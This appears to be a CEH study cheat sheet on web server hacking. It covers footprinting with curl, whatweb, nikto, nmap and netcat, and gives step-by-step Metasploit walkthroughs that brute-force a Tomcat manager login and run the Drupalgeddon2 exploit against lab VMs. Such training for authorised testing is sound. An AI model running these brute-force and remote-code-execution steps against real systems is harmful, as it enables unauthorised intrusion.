#### Wordlists
```bash
/home/attacker/Desktop/CEH_TOOLS/Wordlists/
```
#### Web server technology
```bash
curl -I http://www.certifiedhacker.com
or
telnet <url> 80
```
#### List of common web servers
```bash
1. Apache Server
2. **IIS** (Internet information service) - MSoft
3. Apache tomcat - default in linux OS
4. Ngnix
5. lighttpd
```

#### HTTP Status Code
```bash
1XX -> Informational
2XX -> Success
3XX -> Redirectional
4XX -> Client error
5XX -> Server error
```

#### WhatWeb - CLI based → Alternative to Wappalyzer
```bash
this may provide more infomation about the web technologies than Wappalyzer
New terminal
sudo su
whatweb https://www.tata.com
whatweb hhtps://demo.testfire.net
```
#### Enumerate Web server info
```bash
nmap-  nmap -sV --script=http-enum www.movies.com
```
#### Nikto
```bash
nikto -h http://testfire.net
```
#### Exploiting Apache Tomcat(P8080 - default)
```bash
sudo nmap -p- -sV 192.168.1.36

access the meta 2 ip in parrot browser and access the Tomcat service 
http://192.168.1.36:8180
on the left side > 
Status
Tomcat Administration
Tomcat Manager 
for the above it requires login
new terminal
msfconsole
search tomcat login mgr
info auxiliary/scanner/http/tomcat_mgr_login
use auxiliary/scanner/http/tomcat_mgr_login
show options
set RHOSTS 192.168.1.36
set RPORT 8180
exploit
#this module does bruteforce attack on the target host with port.
once found the username and passwd , login into -> Tomcat status or Tomcat Administration or Tomcat Manager 
```
#### Drupal
```bash
sudo nmap -p- -sV 192.168.1.19

access the Lampiao ip in parrot browser and access the apache service 
http://192.168.1.19:1898

whatweb http://192.168.1.19:1898

nikto -h http://192.168.1.19:1898

new terminal
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS 192.168.1.19
set RPORT 1898
exploit
	-> sysinfo

change target , if anything not works
```

#### Footprint a Web Server using Netcat and Telnet
```bin
Netcat (nc) is a versatile TCP/UDP tool for debugging, transfers, and port scanning, while Telnet is an insecure remote login protocol (port 23) mainly used for testing services like HTTP/SMTP. (Use SSH instead, for security.)

nc -vv www.moviescope.com 80.
GET / HTTP/1.0 -> enter twice
telnet <target> 80
GET / HTTP/1.0 and press Enter twice.

Ex : 
telnet www.moviescope.com 80
```

```bash
#If working with netcat
 nc -vv www.moviescope.com 80
#hit Enter, the netcat will display the hosting information of the provided domain.
#Now, type GET / HTTP/1.0 and press Enter twice.
#Netcat will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information.

#If working with telnet

telnet www.moviescope.com 80
#Type GET / HTTP/1.0 and press Enter twice. Telnet will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information.
```
#### Enumerate Web Server Information using Nmap Scripting Engine (NSE)
```bin
Utilizing Nmap and http-enum.nse content returns a diagram of those applications, registries, and records uncovered.

Script to check Firewall 
script http-waf-decete.nse
```
